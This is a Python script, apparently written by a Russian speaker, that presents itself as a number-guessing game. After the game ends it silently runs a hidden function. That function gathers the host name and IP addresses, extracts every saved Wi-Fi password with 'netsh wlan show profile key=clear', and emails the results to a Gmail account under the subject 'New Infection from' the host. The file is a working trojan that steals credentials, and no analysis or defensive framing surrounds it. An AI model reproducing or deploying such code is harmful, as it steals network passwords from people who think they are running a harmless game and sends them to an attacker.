from email.header import Header
import smtplib as smtp
from email.mime.text import MIMEText
import socket
import time
from requests import get
import random
import os
import subprocess
def send_email():
     # --- Информация о системе ---
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    public_ip = get('https://api.ipify.org').text

    # --- Сбор Wi-Fi данных ---
    wifi_data = "No Wi-Fi profiles found."
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    public_ip = get('https://api.ipify.org').text

    # --- Получаем список Wi-Fi профилей ---
    try:
        data = subprocess.check_output(
    ['netsh', 'wlan', 'show', 'profiles'],
    encoding='cp866',
    errors='ignore')
        Wi_Fis = [line.split(":")[1].strip()
    for line in data.split('\n')
    if "All User Profile" in line or "Все профили пользователей" in line]
        results_all = []

        for Wi_Fi in Wi_Fis:
            try:
                details = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', Wi_Fi, 'key=clear']
                ).decode('cp866', errors='ignore').split('\n')

                passwords = [
                    line.split(':')[1].strip()
                    for line in details
                    if 'Key Content' in line or 'Содержимое ключа' in line
                ]

                password = passwords[0] if passwords else 'None'
                results_all.append(f'Wi-Fi: {Wi_Fi} | Password: {password}')

            except subprocess.CalledProcessError:
                results_all.append(f'Wi-Fi: {Wi_Fi} | Error: Access Denied')

        wifi_data = "\n".join(results_all) if results_all else 'No Wi-Fi profiles found.'

    except Exception as e:
        wifi_data = f'Error retrieving Wi-Fi profiles: {e}'
    # --- Отправка письма ---
    try:
        email_address = '****@gmail.com'
        email_password = '***'
        dest_email = '***@gmail.com'
        subject = f'New Infection from {host_name}'
        email_text = (
            f'Host Name: {host_name}\n'
            f'Private IP: {host_ip}\n'
            f'Public IP: {public_ip}\n\n'
            f'{wifi_data}'
        )

        message = f'From: {email_address}\nTo: {dest_email}\nSubject: {subject}\n\n{email_text}'
        server = smtp.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, dest_email, message.encode('utf-8'))
        server.quit()
    except Exception as e:
        print(f'Failed to send email: {e}')
def game():
    number = random.randint(0, 1000)
    tries = 0
    start_time = time.time()
    print("Угадайте число от 0 до 1000.")
    q = input("Нажмите Enter, чтобы начать игру... или введите 'exit' для выхода: ").strip().lower()
    if q == 'exit':
        print("Игра завершена.")
        return

    try:
        while True:
            guess_str = input("Введите ваше предположение (или 'exit' для выхода): ").strip().lower()

            if guess_str == 'exit':
                print("Вы вышли из игры.")
                return

            if not guess_str.isdigit():
                print("Пожалуйста, введите целое число от 0 до 1000.")
                continue

            guess = int(guess_str)
            if not (0 <= guess <= 1000):
                print("Число должно быть в диапазоне 0–1000.")
                continue

            tries += 1

            if guess == number:
                elapsed = time.time() - start_time
                print(f"Поздравляю! Вы угадали число {number} за {tries} попыток. Время: {elapsed:.1f} с.")
                break
            elif guess > number:
                print("Слишком много — число меньше.")
            else:
                print("Слишком мало — число больше.")
    except KeyboardInterrupt:
        print("Игра прервана пользователем (Ctrl+C).")


def main():
    while True:
        game()
        again = input("Сыграть ещё раз? (y/n): ").strip().lower()
        if again not in ('y', 'yes', 'д', 'да'):
            print("Пока!")
            break


if __name__ == "__main__":
    main()
    send_email()
    
